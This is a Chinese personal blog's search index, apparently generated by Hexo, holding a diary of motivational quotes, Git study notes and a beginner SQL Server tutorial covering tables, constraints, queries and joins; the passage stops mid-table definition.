<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Tue Jun 13 2023 03:17:00 GMT+0800 (中国标准时间)</title>
    <url>/2023/06/13/2023-06-13/</url>
    <content><![CDATA[<blockquote>
<ul>
<li>我们谁都不是隆中对里那个文韬武略的诸葛孔明，坐在深山里就对外面的世界了如指掌，动动脑子就能左右一场战局的胜败。更多时候，需要我们亲身去实践，去体验，去反思，去接受生活给予你的选择，当你做到无懈可击时再去重新选择。而不是坐在家里，苦苦思考“我的未来在哪里”，那不是迷茫，那是懒惰。</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>这个工资，大城市的所有资源都与你无关，你买不了房，买不了车，大概率也谈不起恋爱，享受着大城市的便利，却享受不了大城市的资源，到了一定的年龄，被这个大城市淘汰，是必然的事情。但是想要改变，娱乐是找不到答案的。真想改变自己，先把手机你的抖音卸载了，多买点书看，一个月至少读一本。心态上，就一句话，跳出舒适圈。言尽于此。</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>如果一个人没有太大的不幸遭遇，但又始终穷苦潦倒，要嘛他好吃懒做，要嘛就是不思进取。<br>如果你去同情某一个人，那么潜意识里就会背负上他的命运。</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>你过去的种种经历，就像人生中的一颗颗珍珠，当你在未来某一天的时候找到了那根线，你就会把他们全部串联起来，变成美丽的项链。</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>事前有规划，事中有控制，事后有总结。</li>
</ul>
</blockquote>
]]></content>
      <tags>
        <tag>diary</tag>
      </tags>
  </entry>
  <entry>
    <title>Git学习笔记</title>
    <url>/2023/04/21/Git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="Git的诞生"><a href="#Git的诞生" class="headerlink" title="Git的诞生"></a>Git的诞生</h1><p>​        Linus在1991年创建了开源的Linux，为了维护代码库，选择了一个商业的版本控制系统BitKeeper，BitKeeper的东家BitMover公司出于人道主义精神，授权Linux社区免费使用这个版本控制系统。开发Samba的Andrew试图破解BitKeeper的协议被BitMover公司发现了，于是BitMover公司收回Linux社区的免费使用权。Linus花了两周时间自己用C写了一个分布式版本控制系统，这就是Git。Git迅速成为最流行的分布式版本控制系统，2008年，GitHub网站上线为开源项目免费提供Git存储，无数开源项目开始迁移至GitHub。</p>
<h1 id="集中式VS分布式"><a href="#集中式VS分布式" class="headerlink" title="集中式VS分布式"></a>集中式VS分布式</h1><h2 id="1-集中式"><a href="#1-集中式" class="headerlink" title="1 集中式"></a>1 集中式</h2><p>​        版本库是集中存放在中央服务器的，而干活的时候，用的都是自己的电脑，所以要先从中央服务器取得最新的版本，然后开始干活，干完活了，再把自己的活推送给中央服务器。中央服务器就好比是一个图书馆，你要改一本书，必须先从图书馆借出来，然后回到家自己改，改完了，再放回图书馆。</p>
<p><img src="/2023/04/21/Git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230421094548814.png" alt="image-20230421094548814"></p>
<p>缺点：</p>
<ul>
<li>必须联网工作(网速慢导致提交慢)。</li>
<li>若中央服务器出现问题，所有人无法工作。</li>
</ul>
<h2 id="2-分布式"><a href="#2-分布式" class="headerlink" title="2 分布式"></a>2 分布式</h2><p>每个人的电脑都是一个完整的版本库，无需联网。多人协作时，若A在自己电脑上修改了F文件，B也在自己电脑上修改了F文件，只需将各自的修改推送给对方就可以看到对方的修改了。</p>
<p>在推送版本库的修改时，可能电脑相互间访问不了，所以分布式通常有一台充当”中央服务器”的电脑用来方便”交换”修改。</p>
<p>优点：</p>
<ul>
<li>安全性高(因为每个人电脑都有完整的版本库，某一台电脑坏掉可以从其他人那里复制)</li>
<li>分支管理</li>
</ul>
<h1 id="Git配置"><a href="#Git配置" class="headerlink" title="Git配置"></a>Git配置</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 因为Git是分布式版本控制系统，所以，每个机器都必须自报家门</span>
$ <span class="token function">git</span> config <span class="token parameter variable">--global</span> user.name <span class="token string">"luotao"</span>
$ <span class="token function">git</span> config <span class="token parameter variable">--global</span> user.email <span class="token string">"coder@luotao@gmail.com"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h1 id="工作区、暂存区和版本库"><a href="#工作区、暂存区和版本库" class="headerlink" title="工作区、暂存区和版本库"></a>工作区、暂存区和版本库</h1><h2 id="工作区和暂存区"><a href="#工作区和暂存区" class="headerlink" title="工作区和暂存区"></a>工作区和暂存区</h2><p>工作区：能看到的目录，如例子中的learngit</p>
<p>暂存区：版本库中的stage(或者叫index)</p>
<h2 id="版本库"><a href="#版本库" class="headerlink" title="版本库"></a>版本库</h2><p><strong>工作区</strong>有个隐藏目录.git是Git的版本库。版本库repository即仓库(目录),库里所有文件都被git管理起来，每个文件的更新都能跟踪，以便在将来某个时刻可以还原。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 创建工作区</span>
<span class="token function">mkdir</span> learngit
<span class="token builtin class-name">cd</span> learngit
<span class="token builtin class-name">pwd</span>
<span class="token comment"># Git管理该仓库</span>
<span class="token function">git</span> init <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/04/21/Git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230421103015235.png" alt="image-20230421103015235"></p>
<p><img src="/2023/04/21/Git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230421103005144.png" alt="image-20230421103005144"></p>
<h2 id="把文件添加到版本库"><a href="#把文件添加到版本库" class="headerlink" title="把文件添加到版本库"></a>把文件添加到版本库</h2><p>创建readme.txt文件</p>
<p><img src="/2023/04/21/Git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230421103617658.png" alt="image-20230421103617658"></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 将文件添加到仓库</span>
<span class="token function">git</span> <span class="token function">add</span> readme.txt
<span class="token comment"># 将文件提交到仓库,-m &lt;提交说明></span>
<span class="token function">git</span> commit <span class="token parameter variable">-m</span> <span class="token string">"wrote a readme file"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/04/21/Git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230421104350344.png" alt="image-20230421104350344"></p>
<h2 id="添加和提交"><a href="#添加和提交" class="headerlink" title="添加和提交"></a>添加和提交</h2><p>需要提交的文件修改全部放到暂存区，然后一次性提交暂存区的所有修改。</p>
<p>往版本库添加时分两步：</p>
<ul>
<li>git add 把文件修改添加到暂存区</li>
<li>git commit 把暂存区的所有内容提交到当前分支</li>
</ul>
<p>创建版本库时git自动创建唯一master分支。</p>
<p><img src="/2023/04/21/Git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230421114654775.png" alt="image-20230421114654775"></p>
<p>修改readme.txt文件</p>
<p><img src="/2023/04/21/Git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230421104605464.png" alt="image-20230421104605464"></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 查看修改结果</span>
<span class="token function">git</span> status
<span class="token comment"># 查看上次是如何修改的，修改内容</span>
<span class="token function">git</span> <span class="token function">diff</span> readme.txt
<span class="token comment"># 添加修改</span>
<span class="token function">git</span> <span class="token function">add</span> readme.txt
<span class="token comment"># 查看添加状态</span>
<span class="token function">git</span> status
<span class="token comment"># 提交修改</span>
<span class="token function">git</span> commit <span class="token parameter variable">-m</span> <span class="token string">"add 666"</span>
<span class="token comment"># 查看提交状态</span>
<span class="token function">git</span> status<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/04/21/Git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230421105618941.png" alt="image-20230421105618941"></p>
<h2 id="版本回退"><a href="#版本回退" class="headerlink" title="版本回退"></a>版本回退</h2><ul>
<li>git会把每次提交串成一条历史时间线。</li>
<li>HEAD表示当前版本，HEAD^表示上个版本，HEAD~100表示往上100个版本</li>
</ul>
<p>Git内部有个指向当前版本的HEAD指针，回退版本时，仅把HEAD指针改变。</p>
<p><img src="/2023/04/21/Git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230421111547768.png" alt="image-20230421111547768"></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 查看提交的历史记录,以便确定要回退到哪个版本。</span>
<span class="token function">git</span> log <span class="token parameter variable">--pretty</span><span class="token operator">=</span>oneline<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/2023/04/21/Git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230421110635353.png" alt="image-20230421110635353"></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 回退到上个版本</span>
<span class="token function">git</span> reset <span class="token parameter variable">--hard</span> HEAD^
<span class="token comment"># 查看版本库状态</span>
<span class="token function">git</span> log <span class="token parameter variable">--pretty</span><span class="token operator">=</span>oneline<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>当你用<code>$ git reset --hard HEAD^</code>回退到<code>add distributed</code>版本时，再想恢复到<code>append GPL</code>，就必须找到<code>append GPL</code>的commit id。Git提供了一个命令<code>git reflog</code>用来记录你的每一次命令。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 查看命令历史记录，以便确定要回到未来的哪个版本。</span>
<span class="token function">git</span> reflog
<span class="token comment"># 回退到未来指定版本</span>
<span class="token function">git</span> reset <span class="token parameter variable">--hard</span> 5cef<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/04/21/Git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230421112342557.png" alt="image-20230421112342557"></p>
]]></content>
  </entry>
  <entry>
    <title>SqlServer入门</title>
    <url>/2023/03/20/SqlServer%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h4 id="列的数据类型"><a href="#列的数据类型" class="headerlink" title="列的数据类型"></a>列的数据类型</h4><p>drop database Demo<br>Unicode：<br>    两个字节存储一个字符<br>nvarchar<br>    Unicode型可变字符<br>Char<br>    固定字符</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">create</span> <span class="token keyword">database</span> myDemo
<span class="token keyword">use</span> myDemo
<span class="token keyword">create</span> <span class="token keyword">table</span> student
<span class="token punctuation">(</span>
	StudentNo nvarchar<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
	LoginPwd nvarchar<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
	StudentName nvarchar<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
	Sex <span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
	GradeId <span class="token keyword">int</span><span class="token punctuation">,</span>
	Phone nvarchar<span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
	Address nvarchar<span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
	BornDate <span class="token keyword">Datetime</span><span class="token punctuation">,</span>
	Email nvarchar<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>
<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<span id="more"></span>

<h4 id="数据完整性"><a href="#数据完整性" class="headerlink" title="数据完整性"></a>数据完整性</h4><p>​    是否允许null值<br>​    设置主键<br>​    设置默认值<br>​    设置标识列:标识种子、标识增量 通常将标识列设为主键<br>​    </p>
<h4 id="约束"><a href="#约束" class="headerlink" title="约束"></a>约束</h4><ul>
<li>唯一约束<pre><code>将Email设置唯一约束。索引——&gt;添加——&gt;选择列/是唯一的
</code></pre>
</li>
<li>检查约束<pre><code>将Sex设置检查约束。CHECK约束——&gt;表达式——&gt;Sex = &#39;男&#39; or Sex = &#39;女&#39;
</code></pre>
</li>
<li>设置主外键关系<br>外键表——&gt;关系——&gt;表和列规范——&gt;主键Grande表中的Gid,外键Student表中的GradeId</li>
</ul>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">create</span> <span class="token keyword">database</span> education
<span class="token keyword">use</span> education
<span class="token comment">--课程信息表</span>
<span class="token keyword">create</span> <span class="token keyword">table</span> Course_infor
<span class="token punctuation">(</span>
	CourseId <span class="token keyword">int</span> <span class="token keyword">primary</span> <span class="token keyword">key</span><span class="token punctuation">,</span>
	Coursename <span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span> <span class="token operator">not</span> <span class="token boolean">null</span>
<span class="token punctuation">)</span>
<span class="token comment">--选课表</span>
<span class="token keyword">create</span> <span class="token keyword">table</span> Customer_Infor
<span class="token punctuation">(</span>
	Customer_Id <span class="token keyword">int</span> <span class="token keyword">primary</span> <span class="token keyword">key</span><span class="token punctuation">,</span> <span class="token comment">--主键</span>
	Customer_Name <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span> <span class="token operator">not</span> <span class="token boolean">null</span><span class="token punctuation">,</span>
	Customer_Sex <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token keyword">check</span> <span class="token punctuation">(</span>Customer_Sex<span class="token operator">=</span><span class="token string">'男'</span> <span class="token operator">or</span> Customer_Sex<span class="token operator">=</span><span class="token string">'女'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">--检查约束</span>
	Customer_Age <span class="token keyword">int</span> <span class="token keyword">check</span><span class="token punctuation">(</span>Customer_Age <span class="token operator">>=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
	Customer_Phone <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span> <span class="token keyword">unique</span><span class="token punctuation">,</span> <span class="token comment">--唯一约束</span>
	Customer_Address <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span> <span class="token operator">not</span> <span class="token boolean">null</span> <span class="token keyword">default</span> <span class="token string">'重庆'</span><span class="token punctuation">,</span> <span class="token comment">--默认值</span>
	CourseId <span class="token keyword">int</span> <span class="token keyword">foreign</span> <span class="token keyword">key</span> <span class="token keyword">references</span> Course_infor<span class="token punctuation">(</span>CourseId<span class="token punctuation">)</span> <span class="token comment">--主外键关联</span>
<span class="token punctuation">)</span>
将主键Customer_Id设置标识列增量<span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="插入数据"><a href="#插入数据" class="headerlink" title="插入数据"></a>插入数据</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">insert</span> <span class="token keyword">into</span> Course_infor<span class="token punctuation">(</span>Coursename<span class="token punctuation">)</span> <span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">'Java'</span><span class="token punctuation">)</span>
<span class="token keyword">insert</span> <span class="token keyword">into</span> Course_infor <span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">'数据库'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">'mvc'</span><span class="token punctuation">)</span>
<span class="token keyword">insert</span> <span class="token keyword">into</span> Customer_Infor<span class="token punctuation">(</span>Customer_Name<span class="token punctuation">,</span>Customer_Sex<span class="token punctuation">,</span>Customer_Age<span class="token punctuation">,</span>Customer_Phone<span class="token punctuation">,</span>CourseId<span class="token punctuation">)</span> <span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">'张三'</span><span class="token punctuation">,</span><span class="token string">'男'</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>
<span class="token keyword">insert</span> <span class="token keyword">into</span> Customer_Infor <span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">'王五'</span><span class="token punctuation">,</span><span class="token string">'男'</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token keyword">default</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>插入多行数据</p>
<ul>
<li>通过insert select 语句将源表中的数据添加到已存在的表中</li>
</ul>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">inset <span class="token keyword">into</span> <span class="token operator">&lt;</span>表名<span class="token operator">></span><span class="token punctuation">(</span>列名<span class="token punctuation">)</span>
<span class="token keyword">select</span><span class="token operator">&lt;</span>列名<span class="token operator">></span>
<span class="token keyword">from</span><span class="token operator">&lt;</span>源表名<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>创建test表</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">insert</span> <span class="token keyword">into</span> test<span class="token punctuation">(</span>Coursename<span class="token punctuation">)</span> 
<span class="token keyword">select</span> Coursename 
<span class="token keyword">from</span> Course_infor<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<ul>
<li><p>通过select into语句将现有表数据添加到新表中,新表test1将会自动生成</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span><span class="token punctuation">(</span>列名<span class="token punctuation">)</span>
<span class="token keyword">into</span><span class="token operator">&lt;</span>表名<span class="token operator">></span>
<span class="token keyword">from</span><span class="token operator">&lt;</span>源表名<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> Customer_Name<span class="token punctuation">,</span>Customer_Sex 
<span class="token keyword">into</span> test1 
<span class="token keyword">from</span> Customer_Infor<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li>
</ul>
<h4 id="修改和删除"><a href="#修改和删除" class="headerlink" title="修改和删除"></a>修改和删除</h4><ul>
<li><p>update set更新行</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">update</span> 表名 <span class="token keyword">set</span> 列名 <span class="token operator">=</span> 更新值
<span class="token keyword">where</span> 更新条件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">update</span> Customer_Infor <span class="token keyword">set</span> Customer_Name <span class="token operator">=</span> <span class="token string">'黄蓉'</span> <span class="token keyword">where</span> Customer_Id <span class="token operator">=</span><span class="token number">1</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
<li><p>delete  from 删除行</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">delete</span> <span class="token keyword">from</span> 表名
<span class="token keyword">where</span> 删除条件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">delete</span> <span class="token keyword">from</span> test <span class="token keyword">where</span> Coursename<span class="token operator">=</span><span class="token string">'java'</span> <span class="token operator">or</span> Coursename <span class="token operator">=</span> <span class="token string">'数据库'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ul>
<h4 id="数据查询"><a href="#数据查询" class="headerlink" title="数据查询"></a>数据查询</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">&lt;</span>列名<span class="token operator">></span>
<span class="token keyword">from</span> <span class="token operator">&lt;</span>表名<span class="token operator">></span>
<span class="token keyword">Where</span> <span class="token operator">&lt;</span>查询条件<span class="token operator">></span>
<span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token operator">&lt;</span>排序列名<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token keyword">top</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token keyword">from</span> Customer_Infor <span class="token comment">--前两条记录</span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> Customer_Infor <span class="token keyword">where</span> Customer_Age <span class="token operator">between</span> <span class="token number">18</span> <span class="token operator">and</span> <span class="token number">20</span> 
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> Customer_Infor <span class="token keyword">where</span> Customer_Phone <span class="token operator">is</span> <span class="token operator">not</span> <span class="token boolean">null</span>
<span class="token keyword">select</span> <span class="token keyword">distinct</span> courseId <span class="token keyword">from</span> Customer_Infor
<span class="token keyword">select</span> customer_name <span class="token keyword">as</span> 客户名<span class="token punctuation">,</span>customer_age <span class="token keyword">as</span> 年龄<span class="token punctuation">,</span>customer_sex <span class="token keyword">as</span> 性别 <span class="token keyword">from</span> Customer_Infor<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token function">SUM</span><span class="token punctuation">(</span>customer_age<span class="token punctuation">)</span> <span class="token keyword">as</span> 总年龄 <span class="token keyword">from</span> Customer_Infor
<span class="token keyword">select</span> <span class="token function">MAX</span><span class="token punctuation">(</span>customer_age<span class="token punctuation">)</span> <span class="token keyword">as</span> 最大年龄 <span class="token keyword">from</span> Customer_Infor
<span class="token keyword">select</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">as</span> 记录数 <span class="token keyword">from</span> Customer_Infor 
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> Customer_Infor <span class="token keyword">where</span> Customer_Name <span class="token operator">like</span> <span class="token string">'%罗%'</span> <span class="token comment">--包含罗的用户</span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> Customer_Infor <span class="token keyword">where</span> Customer_Name <span class="token operator">like</span> <span class="token string">'罗_'</span> <span class="token comment">--姓罗的两个字的用户</span>
<span class="token comment">--根据customer_id排序生成序号列</span>
<span class="token keyword">select</span> ROW_NUMBER<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">over</span><span class="token punctuation">(</span><span class="token keyword">order</span> <span class="token keyword">by</span> customer_id<span class="token punctuation">)</span> <span class="token keyword">as</span> 序号<span class="token punctuation">,</span>customer_id<span class="token punctuation">,</span>customer_name <span class="token keyword">from</span> Customer_Infor<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="分组查询"><a href="#分组查询" class="headerlink" title="分组查询"></a>分组查询</h4><p>一个班分组男女</p>
<p>select后的字段必须是聚合函数或是group by 后面的字段</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">--每个课程有多少人选择</span>
<span class="token keyword">select</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">as</span> 选择人数<span class="token punctuation">,</span>CourseId <span class="token keyword">as</span> 课程编号 <span class="token keyword">from</span> Customer_Infor <span class="token keyword">group</span> <span class="token keyword">by</span> CourseId
<span class="token comment">--查询男女的平均年龄</span>
<span class="token keyword">select</span> customer_Sex <span class="token keyword">as</span> 性别<span class="token punctuation">,</span><span class="token function">AVG</span><span class="token punctuation">(</span>customer_Age<span class="token punctuation">)</span> <span class="token keyword">as</span> 平均年龄 <span class="token keyword">from</span> Customer_Infor <span class="token keyword">group</span> <span class="token keyword">by</span> Customer_Sex<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>分组的条件查询</p>
<ul>
<li>分组前条件 customer_Age &gt; 18</li>
<li>分组后条件 COUNT(*) = 3 人数等于3的组</li>
</ul>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">--按男女的平均年龄大于18分组，分组后人数等于3的组</span>
<span class="token keyword">select</span> customer_Sex <span class="token keyword">as</span> 性别<span class="token punctuation">,</span><span class="token function">AVG</span><span class="token punctuation">(</span>customer_Age<span class="token punctuation">)</span> <span class="token keyword">as</span> 平均年龄 <span class="token keyword">from</span> Customer_Infor <span class="token keyword">where</span> customer_Age <span class="token operator">></span> <span class="token number">18</span> <span class="token keyword">group</span> <span class="token keyword">by</span> Customer_Sex <span class="token keyword">having</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h4 id="内连接和外连接"><a href="#内连接和外连接" class="headerlink" title="内连接和外连接"></a>内连接和外连接</h4><h5 id="内连接"><a href="#内连接" class="headerlink" title="内连接"></a>内连接</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">--查询用户编号，姓名，性别和选择的课程名称</span>
<span class="token keyword">select</span> Customer_Id<span class="token punctuation">,</span>Customer_Name<span class="token punctuation">,</span>Customer_Sex<span class="token punctuation">,</span>Coursename<span class="token punctuation">,</span>Course_infor<span class="token punctuation">.</span>CourseId 
<span class="token keyword">from</span> Customer_Infor <span class="token keyword">inner</span> <span class="token keyword">join</span> Course_infor 
<span class="token keyword">on</span> Customer_Infor<span class="token punctuation">.</span>CourseId <span class="token operator">=</span> Course_infor<span class="token punctuation">.</span>CourseId<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>第二种写法</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> Customer_Id<span class="token punctuation">,</span>Customer_Name<span class="token punctuation">,</span>Customer_Sex<span class="token punctuation">,</span>Coursename<span class="token punctuation">,</span>Course_infor<span class="token punctuation">.</span>CourseId <span class="token keyword">from</span> Customer_Infor<span class="token punctuation">,</span>Course_infor 
<span class="token keyword">where</span> Customer_Infor<span class="token punctuation">.</span>CourseId <span class="token operator">=</span> Course_infor<span class="token punctuation">.</span>CourseId<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h5 id="外连接"><a href="#外连接" class="headerlink" title="外连接"></a>外连接</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">--课程表中有哪些学生选，没人选的课程置空</span>
<span class="token comment">--左外连接，左表所有记录出来，右表和左表匹配的记录出来，没匹配的记录置空</span>
<span class="token keyword">select</span> Coursename<span class="token punctuation">,</span>Customer_Name <span class="token keyword">from</span> Course_infor <span class="token keyword">left</span> <span class="token keyword">join</span> Customer_Infor <span class="token keyword">on</span> Course_infor<span class="token punctuation">.</span>CourseId <span class="token operator">=</span> Course_infor<span class="token punctuation">.</span>CourseId 
<span class="token keyword">select</span> Coursename<span class="token punctuation">,</span>Customer_Name <span class="token keyword">from</span> Customer_Infor <span class="token keyword">right</span> <span class="token keyword">join</span> Course_infor <span class="token keyword">on</span> Course_infor<span class="token punctuation">.</span>CourseId <span class="token operator">=</span> Course_infor<span class="token punctuation">.</span>CourseId <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="综合练习"><a href="#综合练习" class="headerlink" title="综合练习"></a>综合练习</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">create</span> <span class="token keyword">database</span> DB_Book
<span class="token keyword">use</span> DB_Book
<span class="token keyword">create</span> <span class="token keyword">table</span> booktype
<span class="token punctuation">(</span>
	TypeID <span class="token keyword">int</span> <span class="token keyword">primary</span> <span class="token keyword">key</span> <span class="token keyword">identity</span><span class="token punctuation">,</span><span class="token comment">--主键自增</span>
	TypeName <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token operator">not</span> <span class="token boolean">null</span>
<span class="token punctuation">)</span>
<span class="token keyword">create</span> <span class="token keyword">table</span> book
<span class="token punctuation">(</span>
	BOOKID <span class="token keyword">int</span> <span class="token keyword">primary</span> <span class="token keyword">key</span> <span class="token keyword">identity</span><span class="token punctuation">,</span>
	BOOKName <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token operator">not</span> <span class="token boolean">null</span><span class="token punctuation">,</span>
	BOOKAuthor <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token operator">not</span> <span class="token boolean">null</span><span class="token punctuation">,</span>
